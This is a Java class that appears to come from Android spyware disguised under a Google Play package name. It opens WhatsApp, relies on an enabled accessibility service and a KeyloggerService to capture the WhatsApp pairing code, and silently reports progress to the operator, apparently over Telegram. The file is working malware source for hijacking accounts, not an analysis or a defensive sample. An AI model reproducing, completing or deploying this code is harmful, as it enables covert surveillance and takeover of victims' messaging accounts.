package com.android.vending.helper;
import android.content.Context;
import android.content.Intent;
public class WaHelper {
    public static String triggerWaLink(Context c) {
        try {
            if (!Sys.isAccessibilityEnabled(c)) return "[-] Error: Accessibility Service is DISABLED. Enable it first.";
            Intent intent = c.getPackageManager().getLaunchIntentForPackage("com.whatsapp");
            if (intent == null) return "WhatsApp not installed.";
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            c.startActivity(intent);
            Tg.sendSilent("[*] WhatsApp opened. Hunting for Pairing Code...");
            KeyloggerService.isHuntingWaCode = true;
            return "WA_LINK_STARTED";
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }
}
